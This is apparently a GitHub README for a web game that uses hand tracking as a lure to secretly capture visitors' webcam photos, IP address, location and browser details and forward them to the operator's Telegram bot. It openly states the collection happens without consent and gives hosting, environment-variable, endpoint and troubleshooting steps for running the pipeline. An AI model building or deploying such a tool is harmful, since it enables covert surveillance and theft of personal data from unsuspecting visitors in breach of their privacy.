# Last - Hand Tracking Web Application

A web application that uses hand tracking technology to create an interactive experience while collecting user data.

## 🎯 Project Overview

This project consists of a frontend web application that uses hand tracking for interactive gameplay, paired with a backend server that processes and transmits user data to a Telegram bot.

## ⚠️ Important Security Notice

**This application collects and transmits user data without explicit consent, including:**

- 📸 User photos captured via webcam
- 🌐 IP address and location information
- 💻 Browser/user agent details
- 🔗 Referral source information
- ⏰ Timestamp of access

## 🏗️ Project Architecture

### Frontend (Client-Side)
- **Technology**: HTML5, JavaScript, Computer Vision
- **Features**: 
  - Real-time hand tracking
  - Camera access interface
  - Interactive game mechanics
  - Data capture and transmission

### Backend (Server-Side)
- **Technology**: Node.js, Express.js
- **Features**:
  - REST API endpoints
  - Data processing and validation
  - Telegram bot integration
  - IP address detection
  - Photo processing

## 🌐 Hosting Details

### Frontend Hosting - GitHub Pages
- **Platform**: GitHub Pages
- **URL**: `https://docs.github.com/en/pages/quickstart`
- **Configuration**: 
  - Static site hosting
  - Automatic deployment from repository
  - HTTPS enabled
  - Custom domain support (if configured)

```
I created a different repo for hosting in github pages you can make a workflow to host it too.
```

### Backend Hosting - Render
- **Platform**: Render.com
- **Service**: Web Service
- **Configuration**:
  - Node.js environment
  - Environment variables management
  - Automatic deployments
  - Scale configuration

## 🚀 Deployment Setup

### Backend Deployment (Render)

1. **Environment Variables Required**:
```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_USER_ID=your_user_id_here
PORT=3000
NODE_ENV=production
```

2. **Render Configuration**:
   - **Build Command**: `npm install`
   - **Start Command**: `node server.js`
   - **Node Version**: 18.x or higher

### Frontend Deployment (GitHub Pages)

1. **Repository Settings**:
   - Go to Settings → Pages
   - Select deployment source (typically `main` branch)
   - Enable GitHub Pages

2. **Custom Domain** (Optional):
   - Add `CNAME` file with domain
   - Configure DNS settings

## 📡 API Endpoints

### Backend Server (`server.js`)

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/user-data` | POST | Receives user photo and IP data |
| `/health` | GET | Health check endpoint |
| `/` | GET | Server information |

### Data Flow
1. Frontend captures hand tracking data and photos
2. Sends POST request to `/api/user-data`
3. Backend processes and forwards to Telegram
4. Response returned to frontend

## 🔧 Technical Requirements

### Backend Dependencies
```json
{
  "express": "^4.18.0",
  "cors": "^2.8.5",
  "axios": "^1.0.0",
  "dotenv": "^16.0.0"
}
```

### Frontend Requirements
- Modern web browser with camera support
- HTTPS connection (for camera access)
- WebRTC compatibility

## ⚙️ Environment Setup
```
### Local Development
1. Clone the repository
2. Install backend dependencies: `npm install`
3. Set up environment variables
4. Start backend server: `node server.js`
5. Open frontend in browser
```
### Production Deployment
1. Backend deployed on Render
2. Frontend deployed on GitHub Pages
3. Environment variables configured in Render dashboard
4. CORS configured for cross-origin requests

## 🔒 Security Configuration

### CORS Settings
```javascript
app.use(cors());
// Allows requests from GitHub Pages and other origins
```

### Data Processing
- Base64 image decoding
- Buffer conversion for photo transmission
- IP address extraction from request headers

## 📊 Monitoring & Logging

### Backend Logging
- Request IP addresses
- Telegram API responses
- Error handling with fallback methods
- Health check monitoring

### Telegram Integration
- Message formatting with HTML
- Photo and document fallback transmission
- Error handling for failed sends

## 🛠️ Troubleshooting

### Common Issues

1. **Camera Access Denied**
   - Ensure HTTPS connection
   - Check browser permissions

2. **Backend Connection Failed**
   - Verify Render service status
   - Check CORS configuration

3. **Telegram Notifications Not Working**
   - Validate environment variables
   - Check bot token and user ID

4. **GitHub Pages Deployment**
   - Verify repository settings
   - Check for build errors

## 📝 Legal & Compliance

**Important**: This application's data collection practices may not comply with:
- GDPR requirements
- CCPA regulations
- Various international privacy laws
- Platform terms of service

## 🔍 Maintenance

### Regular Checks
- Render service uptime
- GitHub Pages deployment status
- Telegram bot functionality
- Domain SSL certificates (if using custom domain)

### Updates
- Node.js version compatibility
- Dependency security updates
- Browser compatibility changes
